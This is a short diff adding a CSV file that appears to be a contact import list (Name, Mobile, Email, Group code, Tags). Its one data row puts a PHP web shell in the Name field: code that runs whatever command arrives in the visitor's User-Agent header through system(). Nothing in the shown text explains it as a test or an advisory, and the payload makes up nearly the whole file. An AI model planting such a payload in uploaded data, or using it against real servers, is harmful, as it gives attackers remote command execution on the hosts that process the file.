@@ -1,0 +1,2 @@
+Name,Mobile,Email,Group code,Tags
+<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>,2,,,
